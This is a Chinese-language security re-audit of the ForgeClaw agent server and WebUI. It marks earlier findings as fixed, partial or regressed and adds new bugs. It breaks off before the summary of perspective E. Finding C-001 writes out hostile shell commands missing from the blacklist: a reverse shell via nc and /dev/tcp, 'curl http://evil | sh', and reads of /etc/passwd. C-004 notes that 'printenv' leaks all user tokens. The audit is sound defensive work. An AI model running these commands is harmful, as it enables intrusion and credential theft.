# ForgeClaw 修复后重新审计报告

> change-id: `re-audit-after-fixes`
> 审计日期: 2026-07-11
> 审计方式: 6 个独立子代理并行重新审计（视角 A-F），主代理汇总
> 审计基线: 当前 HEAD `be8ac66 fix: address audit findings (#2)`（2026-07-08）
> 对照基线: 首轮 `AUDIT_REPORT.md`（2026-07-05，109 条发现）

## 摘要

本次重新审计对首轮 109 条发现逐条对照当前 HEAD 代码标注状态，并检测 `be8ac66` 修复提交引入的合并回归与新 bug。

### 状态分布

| 视角 | 范围 | FIXED | PARTIAL | NOT-FIXED | REGRESSED | NEW | 小计 |
|------|------|------|---------|-----------|-----------|-----|------|
| A | Rust 类型/错误处理（core/llm/tools） | 11 | 2 | 4 | 1 | 2 | 20 |
| B | 并发与缓存正确性 | 5 | 2 | 7 | 0 | 3 | 17 |
| C | 安全沙箱与鉴权 | 10 | 3 | 9 | 0 | 3 | 25 |
| D | API/WebSocket/编排器 | 12 | 4 | 4 | 0 | 2 | 22 |
| E | 前端 WebUI | 16 | 5 | 3 | 0 | 6 | 30 |
| F | CI/CD 与构建配置 | 5 | 1 | 2 | 0 | 5 | 13 |
| **合计** | | **59** | **17** | **29** | **1** | **21** | **127** |

> 注：首轮 109 条中，E-015/E-016/E-017 的"依赖版本号异常"前提有误（TypeScript 6.0 / Vite 8 / Vue Router 5 均为 2026 真实稳定版本，lockfile 一致），实际不构成 bug，仍计入 NOT-FIXED 但标注为「前提错误，实际 N/A」。NEW 共 21 条（含 4 条 P1、1 条 P0、16 条 P2）。

### 当前总体健康度评估

**从「不可发布（红色）」提升至「可发布但带病（黄色）」**。首轮 24 条 P0 中，经本轮验证：

- **已修复 19 条**（C-002/C-003/C-006/C-007/C-008/C-009、D-001/D-002/D-003/D-004、E-001/E-002/E-003/E-004/E-006/E-007/E-008、F-002）
- **前提错误 3 条**（E-015/E-016/E-017，版本号实际有效）
- **部分修复 1 条**（C-001 黑名单仍缺高危命令）
- **未修复 2 条**（C-004 env_clear、C-005 landlock 沙箱）
- **新增 1 条 P0**（F-NEW-001 本地 cargo check 失败）

**核心进展**：WebUI 从「完全不可用」变为「基本可用」；并发核心竞态 B-001 已修（`Arc<RwLock<History>>` + 持写锁跑 LLM）；编排器 4 个 P0（死循环/错误吞没/误判 Complete/跨用户覆盖）全部修复；ticket 一次性鉴权取代 query token，TraceLayer 脱敏。

**最高危残留**：C-004（ShellTool 子进程继承全部环境变量，`printenv FORGECLAW_USERS` 直接泄漏全部用户 token 明文绕过鉴权）仍是开箱即破的 P0，未在本轮修复。

**合并回归**：A-002（`Session.messages` 重新 `pub`）因 `be8ac66` 显式回退 `model.rs` 而回归，但核心 append-only 已由 `History`（`Arc<RwLock>`）类型层面守护，该回归影响有限。被删 3 个 orchestrator 测试中有 2 个覆盖路径无替代守护。

---

## 视角 A — Rust 类型/错误处理重新审计（core/llm/tools）

### 首轮发现状态标注

- **A-001** [FIXED] P1 | `crates/tools/src/search.rs:88-108,184-212` | `SearchTool`/`GrepTool` 同步阻塞 IO 已包入 `tokio::task::spawn_blocking`，不再卡 tokio worker。
- **A-002** [REGRESSED] P1 | `crates/core/src/model.rs:17` | `Session.messages` 仍是 `pub` 字段。首轮修复随 `be8ac66` 合并时 model.rs 被显式回退到 main 版本而撤销。**回归原因**：`be8ac66` 提交说明"Revert model.rs to main's version (keep messages public)"。注意：核心 append-only 已由 `History`（llm/src/lib.rs 私有字段 + `Arc<RwLock>`）守护，该回归影响主要在类型层面与双份存储风险。
- **A-003** [FIXED] P1 | `crates/tools/src/shell.rs:43` | 危险命令正则扩展为 `\brm\s+-rf\s+/\S*`，拦截子目录删除；改用 `\b` 词边界拦截 `$(rm -rf /)`。测试覆盖。
- **A-004** [FIXED] P2 | `crates/llm/src/client.rs:204-223` | 移除冗余 `timeout` 字段，timeout 降为 `new()` 局部变量并实际生效。
- **A-005** [FIXED] P2 | `crates/llm/src/lib.rs:30-49,70` | `ChatMessage.role` 改 `enum Role` + `#[serde(rename_all = "lowercase")]`。
- **A-006** [FIXED] P2 | 三个 Cargo.toml + 源码 | `core` 删 tracing、`llm` 删 forgeclaw-core、`llm`/`tools` 的 tracing 已实际调用。依赖清理彻底，未因 Cargo.toml 回退而变化。
- **A-007** [PARTIAL] P2 | `crates/tools/src/shell.rs:164-169` | io 错误改入 `ToolResult.error`，但命令文本未进错误信息。残留：LLM 收到 "spawn/io failed: ..." 不知是哪条命令。
- **A-008** [PARTIAL] P2 | `crates/llm/src/client.rs:246-261,274-288` | 4xx 响应体现已读取（含截断 + char_boundary 保护），但 5xx body 仍丢弃，429 仍未单独重试。
- **A-009** [FIXED] P2 | `crates/llm/src/client.rs:69-70,188-199` | SSE 边界兼容 CRLF（先归一化再找最早边界）。测试覆盖。
- **A-010** [NOT-FIXED] P2 | `crates/tools/src/search.rs:91,187` | `filter_map(|e| e.ok())` 仍静默吞掉遍历错误，无 warn 无计数。
- **A-011** [FIXED] P2 | `crates/core/src/prompt/engine.rs:136-141,144-165` | cache key 按 order + id 二次排序，HashMap 随机序不再影响。
- **A-012** [NOT-FIXED] P2 | `crates/core/src/prompt/section.rs:79` | `trim_matches('"')` 仍未处理 YAML 转义引号。
- **A-013** [FIXED] P2 | `crates/llm/src/lib.rs:106-114` | `ChatMessage::tool` 构造器已补全，防遗漏 `tool_call_id`。
- **A-014** [FIXED] P2 | `crates/llm/src/client.rs:91` | 非法 JSON 改 `tracing::warn!` 落日志，不再静默跳过。
- **A-015** [FIXED] P2 | `crates/tools/src/file.rs:70-81,87-88` | `expand_tilde` 在 HOME 缺失时返回 `None`，由 `is_within` canonicalize 兜底。
- **A-016** [NOT-FIXED] P2 | `crates/tools/src/shell.rs:89-96,98-102` | `check` 缺失 command 时默认 `""` 返回 `Allow`，与 `execute` 报错不一致。
- **A-017** [FIXED] P2 | `crates/tools/src/shell.rs:28,38-64` | 正则改 `OnceLock` 懒加载 + 测试覆盖，panic 风险实质消除。
- **A-018** [NOT-FIXED] P2 | `crates/llm/src/client.rs:248` | 429 仍纳入 `is_client_error()` 不重试，未读 `Retry-After`。

### NEW 发现

- **A-NEW-001** [P2] `crates/tools/src/shell.rs:53-54` | `\beval\b`/`\bexec\b` 过度拦截合法 shell 内建命令（如 `exec cargo run`、`eval $(ssh-agent)`）。修复方向：收窄为 `eval\s+\$`/`exec\s+\$` 仅拦截变量展开形式。
- **A-NEW-002** [P2] `crates/tools/src/search.rs:108,212` | `spawn_blocking(...).await.unwrap_or_default()` 静默吞掉 `JoinError`，任务 panic 返回空 Vec 无 warn。A-001 修复时新引入。修复方向：`.unwrap_or_else(|e| { tracing::warn!(...); Vec::new() })`。

### 视角 A 汇总
FIXED: 11 / PARTIAL: 2 / NOT-FIXED: 4 / REGRESSED: 1 / NEW: 2

---

## 视角 B — 并发与缓存正确性重新审计

### 首轮发现状态标注

- **B-001** [FIXED] P0 | `crates/server/src/api.rs:48-53,172-248` + `ws.rs:172-268` | 核心竞态已修复。`SessionData.history` 改 `Arc<RwLock<History>>`，`chat_handler`/`handle_text_frame` 取 `history_arc.clone()` → 持写锁跑 LLM → `get_mut().extend` 回写，不再 `insert` 覆盖。既存 session 并发请求序列化在 history 写锁上，前缀字节稳定。
- **B-002** [FIXED] P1 | `crates/server/src/ws.rs:230-280` | spawn panic 改四分支 `match`（成功/run 失败/panic/timeout），不再静默吞掉。
- **B-003** [PARTIAL] P1 | `crates/server/src/orchestrator.rs:282-292,344-360,372-431` + `ws.rs:230,109-136` | 主要烧 token 路径已修（`tx.send` 失败 return Error）。残留：(1) `ws.rs:230` timeout 后 join 句柄 drop 未 `abort()`，任务继续后台持 history 写锁；(2) `SESSION_TIMEOUT(600s)` 触发时 join 句柄 drop 不 abort；(3) LLM HTTP 请求进行中客户端断开无法立即感知。
- **B-004** [NOT-FIXED] P1 | `orchestrator.rs:80,120-125,128-132,148-153` + `engine.rs:96-124` | PromptEngine 仍 `tokio::Mutex` 包裹，compile 内含 `std::fs::read_to_string` 同步阻塞 IO，慢盘下阻塞所有 compile。文件读取未改 `tokio::fs`，cache 未拆 `RwLock`。
- **B-005** [FIXED] P1 | `crates/server/src/ws.rs:231-269` | 仅 `got_complete=true` 才 `get_mut().extend` 写回，Err/panic/timeout 不写回，状态不分裂。
- **B-006** [FIXED] P1 | `api.rs:183-209` + `orchestrator.rs:252-260` | 采用"不污染 history"设计：`run_turn` 在 temp 副本上操作，失败时不写回，history 与 session.messages 一致。
- **B-007** [NOT-FIXED] P2 | `engine.rs:26,101-122` | cache HashMap 无上限，无 LRU 淘汰，可无限增长 OOM。
- **B-008** [NOT-FIXED] P2 | `orchestrator.rs:271-277` | 每轮 `tool_specs.to_vec()` 深拷贝，`ChatRequest.tools` 未改 `Option<Arc<[ToolSpec]>>`。
- **B-009** [NOT-FIXED] P2 | `orchestrator.rs:120-125,128-132,148-153` | 同 B-004，compile 仍整段持锁，锁粒度未拆细。
- **B-010** [NOT-FIXED] P2 | `crates/server/src/api.rs:48-53` + 同步点 `api.rs:227-248`/`ws.rs:249-268` | `SessionData` 仍维护两份消息存储（`session.messages` 与 `history`），仅成功路径手动 `extend` 同步且只补 User/Assistant 不补 Tool 结果。B-001 改 `Arc<RwLock>` 未消除双源问题。修复方向：单一真源，`session.messages` 由 `history.messages()` 按需映射。
- **B-011** [PARTIAL] P2 | `crates/server/src/api.rs:311-321` + `api.rs:92-99` + `orchestrator.rs:120-125` | 错误脱敏已实现（`internal_error` 通用文案 + tracing），文件路径泄漏风险消除。残留：profile 名白名单未实现，`req.profile` 任意值透传，可通过 200 vs 500 区分有效 profile 名（状态 oracle）。
- **B-012** [FIXED] P2 | `crates/server/src/api.rs:172-181` + `ws.rs:172-188` | `chat_handler`/`handle_text_frame` 在读锁内仅 `d.history.clone()`（Arc O(1)），随即 drop 读锁再 `history_arc.write().await` 跑 LLM，不再持读锁深拷贝整个 SessionData。配合 B-001 达成 O(1) clone。
- **B-013** [NOT-FIXED] P2 | `crates/server/src/orchestrator.rs:134-146` + `crates/cli/src/commands.rs:131-140` | 两份 `prompt_vars` 仍并存（orchestrator 用 ToolSpec 名，cli 用 Sandbox 注册名），未提取到 `forgeclaw_core` 单一真源，漂移风险与首轮一致。
- **B-014** [NOT-FIXED] P2 | `crates/server/src/orchestrator.rs:161,184` | `run_once`/`run_streaming` 的 system prompt 注入判定仍为 `if history.is_empty()`，未改为检查 `messages().first()` 是否为 system 角色。对"非空但首条非 system"的 history 无保护。

### NEW 发现

- **B-NEW-001** [P1] `crates/server/src/api.rs:172-181,227-248` + `ws.rs:172-188,249-268` | **新建 session 的并发竞态（B-001 修复盲区）**。session 不存在时各自创建独立 `history_arc` 后释放锁，两个并发请求用同一不存在 session_id：A 先完成 `insert`，B 后完成 `get_mut` 命中 A 的数据并 extend，但 `d.history` 仍是 A 的 Arc（B 的被丢弃），导致 `session.messages` 含双方消息而 `history` 只含 A，状态分裂。修复方向：`sessions.write().entry(session_id).or_insert_with(...)` 原子"取或建"history_arc。
- **B-NEW-002** [P2] `crates/server/src/api.rs:42,71-89` | `tickets: Arc<std::sync::Mutex<HashMap>>` 无上限且无过期清理，未消费的 ticket 永久驻留。修复方向：签发时 sweep 过期项或设上限。
- **B-NEW-003** [P2] `crates/server/src/api.rs:73,80` | `tickets.lock().expect(...)` 在 poison 时 panic 传播至 handler 导致进程崩溃。修复方向：`match` 处理 poison 或改 `parking_lot::Mutex`。

### 视角 B 汇总
FIXED: 5 / PARTIAL: 2 / NOT-FIXED: 7 / REGRESSED: 0 / NEW: 3

---

## 视角 C — 安全沙箱与鉴权重新审计

### 首轮发现状态标注

- **C-001** [PARTIAL] P0 | `crates/tools/src/shell.rs:38-64` | 黑名单已扩展（新增 `eval`/`exec`/`bash -c`/`sh -c`/`mkfs`/`dd if=/dev/zero`/`chmod -R 777 /`/fork bomb/`git push --force`/`> /dev/sdX`/`rm -rf /子目录`）。**仍缺失**：`sudo`/`su`/`chmod 777`（无 -R）/`chown`/`cat /etc/passwd`/`cat ~/.ssh`/`env`/`mv`/`cp` 写 `/etc`/`bash -i >& /dev/tcp`/`nc`/`mkfifo`/`curl|sh`/`wget|bash`。LLM 可执行 `sudo rm /`、`cat /etc/passwd`、`nc -e /bin/sh`、`curl http://evil | sh` 均不被拦截。
- **C-002** [FIXED] P0 | `crates/tools/src/shell.rs:38-44` | 正则锚点改 `\b` 词边界，拦截 `$(rm -rf /)`。测试通过。
- **C-003** [FIXED] P0 | `crates/tools/src/shell.rs:43` | `\brm\s+-rf\s+/\S*` 匹配任意绝对子路径。测试通过。
- **C-004** [NOT-FIXED] P0 | `crates/tools/src/shell.rs:140-148` | `Command::new("sh")` 仍继承全部环境变量，**未调用 `env_clear()`**。全 crate Grep `env_clear` 零命中。`DEEPSEEK_API_KEY`/`FORGECLAW_API_KEY`/`FORGECLAW_USERS`（含全部用户 token 明文）仍通过 `printenv FORGECLAW_USERS` 泄漏。**最高危残留**。
- **C-005** [NOT-FIXED] P0 | `crates/tools/src/shell.rs:140-148` + `sandbox.rs` | 未引入 `landlock`/`seccomp`/`bubblewrap`/`firejail`。ShellTool 仅靠 `current_dir` 限制 cwd，可 `cd /` 后读写任意文件、`curl` 外联、`pkill` 杀进程。
- **C-006** [FIXED] P0 | `auth.rs:71-89,199,219` + `ws.rs:62` + `lib.rs:176-178` | WS 鉴权改一次性 ticket：`issue_ticket` 用 `Uuid::new_v4()`（122 bit 熵），`consume_ticket` 用 `tickets.remove` 用后即焚，TTL 60s，ticket 绑定 `user_id`。TraceLayer `make_span_with` 仅记录 path，不记录 query。
- **C-007** [FIXED] P0 | `crates/cli/src/config.rs:108-112` | `save()` 写入后 `set_permissions(0o600)`（`#[cfg(unix)]`）。
- **C-008** [FIXED] P0 | `main.rs:103` + `config.rs:93-97` + `commands.rs:416-432` | 默认 host 改 `127.0.0.1`；`default_for_init` 用 `Uuid::new_v4()` 生成随机 token；非回环绑定时检测弱 token（`change-me`/`local-token`/空）拒绝启动。
- **C-009** [FIXED] P0 | `crates/server/src/ws.rs:172-188` | WS 命中跨用户既存 session 时发 Error 帧 + `return Continue`，不创建不覆盖。与 REST 404 行为对齐。
- **C-010** [PARTIAL] P1 | `crates/server/src/auth.rs:115-119,142,196` | 新增 `constant_time_eq`（`subtle::ConstantTimeEq`）用于 `auth_middleware`/`login_handler`。但 `find_by_token` 仍用 `HashMap::get` 非常量时间查找，泄漏「token 是否存在」时序信号。
- **C-011** [FIXED] P1 | `crates/server/src/lib.rs:151-158` | `/api/auth/login` 套 `GovernorLayer`（60/s, burst 5），key=PeerIP。
- **C-012** [FIXED] P1 | `crates/server/src/api.rs:92-99` | 新增 `internal_error` 函数：`tracing::error!` 落日志，响应体仅返回 `"internal server error"`。
- **C-013** [FIXED] P1 | `crates/cli/src/commands.rs:544-548` | `config set api_key` 用 `masked_api_key()` 脱敏输出。
- **C-014** [FIXED] P1 | `crates/server/src/lib.rs:62-72` | `build_cors_layer` 用 `AllowOrigin::list(origins)` 白名单，不再 `permissive()`。
- **C-015** [NOT-FIXED] P1 | `crates/tools/src/file.rs:213-241` | `FileWriteTool::execute` 的 `is_within` canonicalize 与 `fs::write` 之间存在 TOCTOU 窗口，可被符号链接替换逃逸。
- **C-016** [PARTIAL] P1 | `crates/server/src/auth.rs:22-45,179-183` | `LoginResponse` 改 `UserPublic`（仅 id+name），`User.token` 标 `#[serde(skip_serializing)]`。但 `User` 仍 `#[derive(Debug)]`，`tracing::debug!(?user)` 会打印 token。
- **C-017** [NOT-FIXED] P1 | `crates/server/src/orchestrator.rs:537,565` | `default_sandbox_with_specs`/`restricted_sandbox_with_specs` 均用 `auto_confirm()`，server 模式所有 Confirm 级工具（含 `FileWriteTool`）被自动放行。
- **C-018** [NOT-FIXED] P2 | `crates/tools/src/file.rs:41-63` | `is_sensitive_path` 仍仅硬编码 Unix 路径，无 Windows 分支。
- **C-019** [NOT-FIXED] P2 | `crates/server/src/auth.rs:23` | `User` 仍 `#[derive(Clone, Debug, Serialize)]`，未手写 Debug 跳过 token，未用 `secrecy::Secret`。
- **C-020** [NOT-FIXED] P2 | `crates/server/src/auth.rs:99-101` | `find_by_token` 仍用 `HashMap::get` 非常量时间。
- **C-021** [NOT-FIXED] P2 | `crates/tools/src/file.rs:70-81` | `expand_tilde` 仍用 `std::env::var("HOME")`，可被 shell 注入操纵。未用 `dirs::home_dir()`。
- **C-022** [NOT-FIXED] P2 | `crates/tools/src/search.rs:66,151` | `SearchTool`/`GrepTool` 的 `max` 无服务端硬上限，可传巨值造成内存放大。

### NEW 发现（含 ticket API 安全性）

- **C-NEW-001** [P2] `crates/server/src/api.rs:71-89` + `lib.rs:147` | 过期 ticket 永不清理 + `/api/auth/ticket` 无限流（仅 `/api/auth/login` 有 GovernorLayer）。已认证用户可循环调 `/api/auth/ticket` 累积过期 ticket 造成内存增长。修复方向：`issue_ticket` 时 sweep 过期项；或给 `/api/auth/ticket` 加 GovernorLayer。
- **C-NEW-002** [P2] `crates/server/src/ws.rs:59-62` | ticket 仍走 URL query。虽服务端 TraceLayer 已脱敏，但反向代理 access_log 默认记录完整 URI。60s TTL + 用后即焚使风险大幅降低。修复方向：改用 `Sec-WebSocket-Protocol` 子协议传 ticket，或接受残留风险。
- **C-NEW-003** [P2] `crates/server/src/ws.rs:249-267` + `api.rs:227-247` | 写回 session 时不复核 user_id（TOCTOU）。写锁 `get_mut` 命中 `Some(d)` 时直接 extend 不检查 `d.user_id == user_id`，两个用户同时用相同 session_id 并发时后完成者消息会追加到前者展示副本，`GET /api/sessions/{id}` 跨用户泄漏。需知道目标 session_id + 精确时序。修复方向：写锁分支校验 `d.user_id == user_id`，不匹配则 insert 新 SessionData。

### 视角 C 汇总
FIXED: 10 / PARTIAL: 3 / NOT-FIXED: 9 / REGRESSED: 0 / NEW: 3

---

## 视角 D — API/WebSocket 协议与编排器重新审计

### 首轮发现状态标注

- **D-001** [FIXED] P0 | `crates/server/src/orchestrator.rs:33,250,261-269` | `run_turn` 新增 `max_turns` 参数（`DEFAULT_MAX_TURNS = 25`），超出返回 `OrchestratorEvent::Error`。测试 `run_once_max_turns_exceeded_returns_error` 守护。
- **D-002** [FIXED] P0 | `crates/server/src/ws.rs:172-188` | WS 命中跨用户 session 时发 Error 帧 + `return Continue`，不 `insert` 覆盖。与 REST 404 对齐。ticket 流联动：WS 鉴权改 `?ticket=` 一次性核销。
- **D-003** [FIXED] P0 | `crates/server/src/orchestrator.rs:438-443` | `tool_msg.content` 在 `result.error.is_some()` 时改 `format!("error: {}\n{}", e, result.output)`。测试守护。
- **D-004** [FIXED] P0 | `crates/server/src/orchestrator.rs:313-320` | `Event::Error(message)` 分支 `return Ok(OrchestratorEvent::Error { message })`，不再落入 `Complete { text: "" }`。测试 `run_once_llm_error_does_not_modify_history` 守护。
- **D-005** [FIXED] P1 | `crates/server/src/ws.rs:36-40,83-106,109-136` | 新增 ping 任务每 30s 发 `Message::Ping`，每帧读超时 60s，整体会话超时 600s。实现完整。
- **D-006** [FIXED] P1 | `orchestrator.rs:287-290,350-354,372-384,418-430` + `ws.rs:226` | 非终态 `tx.send` 检查 `.is_err()` → return Error，不再 `let _ =`。WS break 后 `drop(rx)` 触发 spawned task tx.send 失败。**注意：被删测试 `run_streaming_stops_when_receiver_dropped` 曾守护此路径，现已无测试覆盖。**
- **D-007** [FIXED] P1 | `crates/server/src/lib.rs:167` | `DefaultBodyLimit::max(1024 * 1024)`（1MB）。测试 `post_oversized_body_returns_413` 守护。
- **D-008** [PARTIAL] P1 | `crates/server/src/lib.rs:168-171` | `TimeoutLayer` 仍全局 300s（审计建议 120s）。REST 路径安全（handler drop 释放锁），WS 升级后不受约束有独立超时。`max_turns=25` × 单次 LLM 耗时仍可能超 300s（REST）。
- **D-009** [PARTIAL] P1 | `api.rs:92-99` + `ws.rs:285-290` | REST 侧已修（`internal_error` 通用文案 + tracing）。**WS 侧未修**：`OrchestratorEvent::Error { message }` 经 `send_event` 直传前端，LLM Error 消息可能含上游 API URL/状态码细节。
- **D-010** [FIXED] P1 | `crates/server/src/lib.rs:62-72` | `build_cors_layer` 白名单从 `state.allowed_origins` 读取。测试守护。
- **D-011** [PARTIAL] P1 | `crates/server/src/ws.rs:230` | `tokio::time::timeout(TASK_TIMEOUT=300s, join)` 包裹，但 300s 仍较长，且 timeout 触发后不 `join.abort()`，JoinHandle drop 后任务继续运行持 history 写锁（见 D-NEW-001）。
- **D-012** [FIXED] P1 | `orchestrator.rs:369-416,478-483` | `parse_tool_input` 失败时构造 error `ToolResult` 回填，不执行工具不喂 null。**注意：被删测试 `run_once_invalid_tool_arguments_returns_tool_result_error` 曾守护此路径，现已无测试覆盖。**
- **D-013** [FIXED] P2 | `crates/server/src/lib.rs:167-179` | 中间件顺序调整：DefaultBodyLimit → TimeoutLayer → CompressionLayer → CorsLayer → TraceLayer（最外层）。
- **D-014** [PARTIAL] P2 | `crates/server/tests/api_test.rs` | 新增并发不丢消息 + 500 错误路径测试。仍缺 invalid session_id 400、REST 跨用户 chat 404 端到端测试。
- **D-015** [NOT-FIXED] P2 | `crates/server/tests/auth_test.rs:332-377` | 仍仅测试升级前鉴权，无 `tokio-tungstenite` 真实 WS 消息流集成测试。
- **D-016** [NOT-FIXED] P2 | `crates/server/src/api.rs:37` | `sessions: Arc<RwLock<HashMap>>` 仍纯内存，进程重启全丢。
- **D-017** [FIXED] P2 | `crates/server/src/ws.rs:62` + `lib.rs:176-178` | WS 鉴权从 `?token=`（可复用）改 `?ticket=`（一次性 60s TTL）。TraceLayer span 仅记录 path。
- **D-018** [NOT-FIXED] P2 | `orchestrator.rs:276` | `tool_specs.to_vec()` 每轮深拷贝。
- **D-019** [NOT-FIXED] P2 | `orchestrator.rs:80,120-125,148-153` | `PromptEngine` 仍 `tokio::Mutex`，compile 锁全引擎。
- **D-020** [FIXED] P2 | `crates/server/src/ws.rs:69-70,44` | `WebSocketUpgrade` 链式 `.max_message_size(256KB).max_frame_size(256KB)`。

### 被删测试影响评估

通过 `git show be8ac66` 确认被删的 3 个测试：

- **被删测试 1：`run_streaming_stops_when_receiver_dropped`** | 覆盖：receiver 丢弃后 `run_streaming` 应停止（D-006/B-003 客户端断连停止烧 token）| 当前替代：**无** | 风险：**高**。实现有 `tx.send().is_err()` 检查但无测试守护，重构易回归。被删原因：测试期望 `res.is_err()`，但当前 `run_turn` 返回 `Ok(Error)`，契约不同。
- **被删测试 2：`run_once_propagates_llm_stream_error`** | 覆盖：单轮 LLM 立即返回 Error → 传播（D-004）| 当前替代：**部分**——`run_once_llm_error_does_not_modify_history` 用两轮场景，仅断言 `matches!(event, Error { .. })` 不验证 message 内容。| 风险：**低**。
- **被删测试 3：`run_once_invalid_tool_arguments_returns_tool_result_error`** | 覆盖：非法 JSON arguments → error ToolResult 回填（D-012）| 当前替代：**无** | 风险：**高**。`parse_tool_input` 的 `Err(e)` 分支完全无测试覆盖。被删原因：消息文案不匹配（期望 `"invalid arguments json"`，实际 `"invalid tool input: {e}"`）。

### NEW 发现

- **D-NEW-001** [P1] `crates/server/src/ws.rs:230,277-279` | `tokio::time::timeout(TASK_TIMEOUT, join).await` 超时后 JoinHandle 被 drop（Tokio detach），**不调用 `abort()`**。被 detach 的 orchestrator 任务继续运行持 `history_arc.write()` 锁，后续同 session 请求在 spawned task 内 `history_arc.write().await` 无限阻塞，形成孤儿任务堆积。`SESSION_TIMEOUT=600s` 触发时同问题。修复方向：`tokio::select! { r = &mut join => {...}, _ = sleep(TASK_TIMEOUT) => { join.abort(); ... } }`，保留 JoinHandle 引用显式 abort。
- **D-NEW-002** [P2] `crates/server/src/api.rs:42,71-76,79-89` + `auth.rs:215-221` | `tickets` HashMap 无过期清理，`/api/auth/ticket` 无限流。慢速泄漏。修复方向：后台定时 sweep 或 dashmap + TTL；对 `/api/auth/ticket` 加 per-user 限流。

### 视角 D 汇总
FIXED: 12 / PARTIAL: 4 / NOT-FIXED: 4 / REGRESSED: 0 / NEW: 2

---

## 视角 E — 前端 WebUI 重新审计

### 首轮发现状态标注

- **E-001** [FIXED] P0 | `web/index.html:1-12` | HTML 入口骨架补全：`<!doctype html>` + `<html lang="zh-CN">` + `<meta charset>` + `<meta viewport>` + `<title>ForgeClaw</title>` + `<div id="app">` + `<script type="module" src="/src/main.ts">`。残留：未声明 favicon link（见 E-NEW-006）。
- **E-002** [FIXED] P0 | `web/src/views/` | 5 个核心 view 均实现真实业务逻辑：ChatView WS 流式对话、SessionsView 会话列表、PromptsView 加载+编译、ToolsView 工具列表、SettingsView 配置。
- **E-003** [FIXED] P0 | `web/src/router/index.ts:7-51` | 5 条懒加载路由 + `meta.requiresAuth` + `:pathMatch(.*)*` 兜底 + `/` 重定向 `/chat`。
- **E-004** [FIXED] P0 | `web/src/router/index.ts:54-63` | `router.beforeEach` 守卫：未登录跳 `/login?redirect=`，已登录访问 `/login` 跳 `/chat`。
- **E-005** [PARTIAL] P0 | `web/src/api/client.ts:46-102` | API 客户端封装：Bearer 注入、30s `AbortController` 超时、401 派发 `forgeclaw:unauthorized`、`ApiError` 统一错误。**未实现重试**（首轮要求"超时重试"）。
- **E-006** [FIXED] P0 | `web/src/stores/{auth,session,settings}.ts` | 三个 pinia store 均实现：auth（token/user 持久化 + login/logout）、session（列表 + 消息 + open/new/push/pop/reset）、settings（server 地址 + setApiBase）。
- **E-007** [FIXED] P0 | `web/src/App.vue:36-61` | 导航骨架：侧边栏 5 个 router-link + 用户名 + 登出；`route.meta.public` 区分布局；监听 `forgeclaw:unauthorized`。
- **E-008** [FIXED] P0 | `web/src/views/` | HomeView.vue 已删除，无占位文案残留。
- **E-009** [PARTIAL] P1 | `web/src/views/ChatView.vue:113-178` | 流式渲染实现（delta 增量追加 + 按 type 分发）。**未实现 `requestAnimationFrame` 节流**，高频流可能 jank。seq 字段 N/A（后端无 seq）。
- **E-010** [PARTIAL] P1 | `web/src/views/ChatView.vue:180-192` | WS 清理实现（`onUnmounted(cleanupWs)`）。**未实现重连**（首轮要求指数退避）。per-message WS 架构无长连重连需求，但 mid-stream 断连无自动恢复。
- **E-011** [FIXED] P1 | `web/src/` | HelloWorld.vue 删除，`src/assets/` 不存在。
- **E-012** [FIXED] P1 | `web/src/style.css:1-63` | 替换为设计 token + dark mode，`#app` 改 `height: 100svh` + flex。
- **E-013** [FIXED] P1 | `web/README.md:1-40` | 更新为 ForgeClaw WebUI 说明，无模板文案残留。
- **E-014** [FIXED] P1 | `web/public/` | `icons.svg` 删除，仅剩 `favicon.svg`。
- **E-015** [NOT-FIXED（前提错误）] P0→N/A | `web/package.json:21` | `typescript: ~6.0.2` 未改。但 TypeScript 6.0 于 2026-03-23 发布，lockfile 解析为 6.0.3，install 成功。首轮前提过时。
- **E-016** [NOT-FIXED（前提错误）] P0→N/A | `web/package.json:22` | `vite: ^8.1.1` 未改。但 Vite 8.0 于 2026-03-12 发布，lockfile 解析为 8.1.3。首轮前提过时。
- **E-017** [NOT-FIXED（前提错误）] P0→N/A | `web/package.json:15` | `vue-router: ^5.1.0` 未改。但 Vue Router 5.0 于 2026-01 发布。首轮前提过时。
- **E-018** [FIXED] P2 | `web/package.json:12-24` | `@vueuse/core`/`monaco-editor`/`naive-ui` 已移除，源码无引用。PromptsView 重写为纯原生 HTML。
- **E-019** [PARTIAL] P2 | `web/tsconfig.app.json:11-16` | 开启 `noUnusedLocals`/`noUnusedParameters`/`erasableSyntaxOnly`/`noFallthroughCasesInSwitch`。**未显式声明 `strict`**（但 extends `@vue/tsconfig/tsconfig.dom.json`，TS 6.0 默认 strict:true）。
- **E-020** [FIXED] P2 | `web/src/router/index.ts` | 所有 view 路由懒加载。
- **E-021** [FIXED] P2 | `web/src/components/` | HelloWorld.vue 随 components/ 删除，N/A。
- **E-022** [FIXED] P2 | `web/index.html:4-6` | charset/viewport/title 补全。
- **E-023** [PARTIAL] P2 | `web/vite.config.ts:9` | `base: './'` 已设置（适配 rust-embed）。**`build.outDir` 未显式指定**（默认 dist，与 rust-embed folder 一致）。
- **E-024** [FIXED/正面] P2 | `web/src/router/index.ts:6` | `createWebHashHistory()` 对嵌入单二进制场景合理（正面记录）。

### NEW 发现

- **E-NEW-001** [P1] `web/src/views/ChatView.vue:142-156` | **tool_result 回填按 name 匹配易错配**。后端 `tool_call_start` 事件无 id 字段，客户端自行 `crypto.randomUUID()` 生成 id 但从不回传。LLM 同轮多个同名工具调用且乱序完成时，结果回填到错误占位。修复方向：后端事件增加 `call_id` 字段精确关联。
- **E-NEW-002** [P2] `web/src/views/ChatView.vue:83-90` | ticket 获取失败时 `popMessage` 仅移除 assistant 占位，user 消息未清理，注释与实现不一致。修复方向：修正注释或按意图 pop 两次。
- **E-NEW-003** [P2] `web/src/views/ChatView.vue:101-110,170-176` | error/异常 close 路径未清理 assistant 占位，界面残留 `…` 占位泡或半截回复。修复方向：异常路径 `popMessage()` 移除空占位。
- **E-NEW-004** [P2] `web/src/stores/auth.ts:2-4` + `api/types.ts:11-16` | stale 注释 + 浪费首张 ticket。后端 `LoginResponse` 返回 `ticket`，前端丢弃后每次 WS 重新调 `getWsTicket()`。修复方向：用 login 响应 ticket 作首连；修正注释。
- **E-NEW-005** [P2] `web/src/views/PromptsView.vue:21-52` | PromptsView 重写后**无保存功能**（编辑器改动导航后丢失）+ 无 Markdown 预览（compiled 仅 `<pre>` 纯文本）+ CSS token 错引（`--mono` 应为 `--font-mono`）。修复方向：补 `PUT /api/prompts/sections` 保存；修正 token 名。
- **E-NEW-006** [P2] `web/index.html` | favicon 未链接。修复方向：`<head>` 补 `<link rel="icon" type="image/svg+xml" href="/favicon.svg">`。

### 视角 E 汇总
